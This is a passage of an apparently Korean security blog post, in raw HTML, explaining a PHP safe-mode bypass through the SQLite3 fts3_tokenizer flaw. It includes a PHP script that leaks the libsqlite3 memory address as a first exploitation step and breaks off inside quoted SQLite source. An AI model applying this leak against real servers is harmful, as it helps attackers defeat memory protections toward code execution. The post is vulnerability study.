url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI112Oyw6CMBREEXQNLW8ILdAiIGBBE2Mw/v9njemNC+Nikrs4c+44l/mJ2ezo+jtUt8Fsb7R6pXsxOxplYJkoUXBcH+6R4eAF8E4MARcI45bCoxo+q+Bc1xcVRbOgqEYSsbCGqGcM0wNxqiCbBVlx/hNy5OVAXCUnCjG6v1HBFu2XNO8QhBJxqlFWI3wmkGSa1ljRrzDg8ruwoVjmA2MTT0rI5KL2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png\"\n        srcset=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/e9ff0/2.png 180w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/f21e7/2.png 360w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png 720w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/eac55/2.png 887w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>여기까지 간단하게 gdb를 사용해 동적 프로세스 디버깅을 진행하였다. 다음은 실제 취약한 sqlite3 모듈을 분석하여 <code class=\"language-text\">Code Execution</code>이 가능한 부분을 exploitation 하도록 할께요</li>\n</ul>\n<h3 id=\"safe-mode-bypass\" style=\"position:relative;\"><a href=\"#safe-mode-bypass\" aria-label=\"safe mode bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Safe Mode Bypass</h3>\n<ul>\n<li>PHP가 사용하는 모듈에 대한 취약점을 활용하여 Code Execution 을 진행해 System 함수를 실행하는 게 목표</li>\n<li><code class=\"language-text\">Code Execution</code> 을 수행하는데 있어서 Use-After-Free, Buffer-OverFlow 등 많은 CVE들이 존재하며 다음 <code class=\"language-text\">CVE-2015-0273</code>, <code class=\"language-text\">CVE-2015-6834</code> 등이 있습니다.</li>\n</ul>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-0273\">CVE-2015-0273</a></p>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-6834\">CVE-2015-6834</a></p>\n<ul>\n<li>PHP 모듈에 존재하는 취약점을 이용하여 PHP 버전에 의존하지 않고 Exploitation을 진행할 수 있습니다.</li>\n</ul>\n<h3 id=\"php-sqlite-모듈-php-53\" style=\"position:relative;\"><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\" aria-label=\"php sqlite 모듈 php 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SQLite 모듈 (PHP 5.3≥)</h3>\n<ul>\n<li>이번에는 SQLite 모듈에 대한 취약점 분석을 진행하도록 하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY03VQXW+CQBC8+kF9KkgPTuCOO4FCAbHGaGtN+tLE//+TptmNktakD5Pbm83Ozqw4vH+jG07QeYeq3qOodpBxgaY9oOmOSLKGucy0EBMfk9mSQXUoHXK3gV0PI8TH+YKmPWKV1jC2ZzwFBrYY4Iot4lXFnEpe/gg+TAP4S8MLU/06QpzOF/TDJwu6cstuIlWxWwIJkTD17x0GoWXnlE7bHlneQez2X1iXbzxo3ObqULMIIVIlc/GdQ6r9MEeqW15GouRW0P1oUF1JGqbb0D2Il6rk7RT9v8gqqTkup6CYM+8Z80fJ8BaS/94iYtx69JLIb8HpPBznbvgB8BObv94Ag/QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png\"\n        srcset=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/e9ff0/3.png 180w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/f21e7/3.png 360w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png 720w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/84cc5/3.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5UlEQVQY002N0W6CQBREt2qpNlZbq8QKIVRAYGFZYNmyimJbk/7/H03DfWj6cDKTm5szLM1aFNUZsrqA54Z6XhyRCYPV2qd+SBqUqkecauzDEqPJC+7Gz5QD4/vVH8x0P/gwN3r0gwLa3EgeHmr4+wJBVNLIfLHDxHqFNd2QbICNlsT/zkTZoW6ueHNieO+C5GneYuvEyMQRrschZAcuDGR9oSzrHvOFA2u2wfTRpqGHmU1jLEoUlP4iodKfcDyOmGvo9htVc0WleuzchG5DF/IEWZ2RcI1cnhDFCvY2xNoO8LR08QtnvnCMjsUBkwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png\"\n        srcset=\"/static/328a6c8043a5dfeb4cb733617a66114b/e9ff0/4.png 180w,\n/static/328a6c8043a5dfeb4cb733617a66114b/f21e7/4.png 360w,\n/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png 386w\"\n        sizes=\"(max-width: 386px) 100vw, 386px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>취약한 PHP 모듈의 SQLite3 버전은 3.6.20에 해당하며 이는 PHP 5.3 이상 부터 사용가능합니다.</li>\n</ul>\n<h1 id=\"sqlite3-fts3_tokenizer-취약점\" style=\"position:relative;\"><a href=\"#sqlite3-fts3_tokenizer-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite3 fts3_tokenizer 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite3 fts3_tokenizer 취약점</h1>\n<h3 id=\"fts3_tokenizer-overview\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-overview\" aria-label=\"fts3_tokenizer overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer Overview</h3>\n<ul>\n<li>sqlite3에서 fts3_tokenizer를 통한 검색을 위해 사용자 정의 <code class=\"language-text\">tokenizer</code> 를 등록할 수 있는 함수가 있습니다.</li>\n<li>fts3, 4 확장 모듈을 통해 사용자는 데이터베이스에 등록된 특수 테이블인 fts 테이블을 생성할 수 있습니다.</li>\n<li>데이터베이스내의 테이블에 대용량 문서가 많이 포함된 경우에도 하나 이상의 <code class=\"language-text\">token</code> 이 포함된 모든 행에 대해 데이터베이스를 효과적으로 쿼리 수행할 수 있습니다.</li>\n</ul>\n<aside>\n💡 SQLite FTS3,4 Document\n> [https://www.sqlite.org/fts3.html](https://www.sqlite.org/fts3.html)\n</aside>\n<h3 id=\"sqlite-fts3-기능을-활용한-검색-방안\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\" aria-label=\"sqlite fts3 기능을 활용한 검색 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 기능을 활용한 검색 방안</h3>\n<ul>\n<li>SQLite3 쿼리 수행시 Virtual Index Table을 생성하고 요소들을 추가하면서 인덱스를 생성합니다.</li>\n<li>생성된 인덱스(Token)를 <code class=\"language-text\">MATCH</code> 쿼리로 키워드를 검색합니다.</li>\n<li>SQLite는 Simple Tokenizer를 사용합니다.</li>\n</ul>\n<h3 id=\"사용자가-지정할-수-있는-tokenizer의-callback-처리-방식\" style=\"position:relative;\"><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\" aria-label=\"사용자가 지정할 수 있는 tokenizer의 callback 처리 방식 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">xCreate</code> : Initialization</p>\n</li>\n<li>\n<p><code class=\"language-text\">xDestory</code> : destruction</p>\n</li>\n<li>\n<p><code class=\"language-text\">xOpen</code> : create a new tokenize cursor from a user input</p>\n</li>\n<li>\n<p><code class=\"language-text\">xClose</code> : close the cursor</p>\n</li>\n<li>\n<p><code class=\"language-text\">xNext</code> : yield next word</p>\n</li>\n<li>\n<p>callback function pointer 는 <code class=\"language-text\">sqlite3_tokenizer_module</code> 구조체에 등록되어 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">struct sqlite3_tokenizer_module <span class=\"token punctuation\">{</span>\n <span class=\"token keyword type-declaration\">int</span> iVersion<span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xCreate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span> <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> sqlite3_tokenizer <span class=\"token operator\">**</span>ppTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xDestroy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> nBytes<span class=\"token punctuation\">,</span> sqlite3_tokenizer_cursor <span class=\"token operator\">**</span>ppCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xClose<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xNext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">**</span>ppToken<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>pnBytes<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piStartOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piEndOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piPosition<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sqlite-fts3-취약점\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite fts3 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 취약점</h2>\n<h3 id=\"fts3-module-base-address-leaked\" style=\"position:relative;\"><a href=\"#fts3-module-base-address-leaked\" aria-label=\"fts3 module base address leaked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 module base address leaked</h3>\n<ul>\n<li>sqlite3 에는 <code class=\"language-text\">simple</code>, <code class=\"language-text\">porter</code>, <code class=\"language-text\">unicode64</code> … 과 같은 몇 가지의 build-in tokenizer가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'simple'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t↑\n\t\t\t\t\t<span class=\"token number\">16</span> 진수 문자열 반환 <span class=\"token punctuation\">(</span>빅 엔디안 주소<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY04WPTQuCQBRFRy2IQEeDSrLR/JhqUtHMsCKxRSv///+5MRO1CKrF4b7NPY9L+OYAkTbYiCN2+QkeE4iSEixIQR0GolMQzVJohq3QB847PyEx38NfZZAZ8VIhn6y3tSIIc1DHh2UzjMZzGMPJV5kSZsUFbdejqm+4dj2a8x1hXCipyBqFlEr5ggmY1PstlOWyajFzOaZuAsteghDzOVPm65bo9O/kB8BLZIICcAz5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png\"\n        srcset=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e9ff0/5.png 180w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/f21e7/5.png 360w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png 653w\"\n        sizes=\"(max-width: 653px) 100vw, 653px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">fts_tokenizer</code> 는 등록된 tokenizer의 주소를 <code class=\"language-text\">BLOB</code> 인코딩되어 반환하게 되고 built-in-tokenizer를 Query 하게 되면 lib-sqlite3 라이브러리 메모리 영역의 주소가 노출됩니다.</li>\n<li>해당 주소를 기반으로 ASAR을 우회하기 위해 리틀 엔디안으로 변환 작업을 진행합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>취약한 부분의 쿼리를 PHP 코드로 작성하여 쿼리를 수행하여 메모리 릭을 진행합시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 502px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVQI123KzQ6CMBhE0Q80xo2KSilQSgui/AiuXPj+L3aNNe5cTCaTOZKcHFU9Yd0dY0dqP3NWDbq44pqFLO/ITY/SXdhp1gZr/Rxsqi8Upqe0IxLtkbIamJZXOH37CH0bnmy2CpEd0SpB4sMXf/pPfiZeH3kDitwye+jIRWAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png\"\n        srcset=\"/static/ece3868599479ae40e51537c45dfb6e1/e9ff0/6.png 180w,\n/static/ece3868599479ae40e51537c45dfb6e1/f21e7/6.png 360w,\n/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png 502w\"\n        sizes=\"(max-width: 502px) 100vw, 502px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>그렇다면, 해당 부분은 왜 메모리 릭이 가능하지 살펴봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">/* Load the built-in tokenizers into the hash table */</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">==</span><span class=\"token constant\">SQLITE_OK</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pSimple<span class=\"token punctuation\">)</span>\n     <span class=\"token operator\">||</span> <span class=\"token class-name\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"porter\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPorter<span class=\"token punctuation\">)</span> \n     <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>pIcu <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"icu\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span 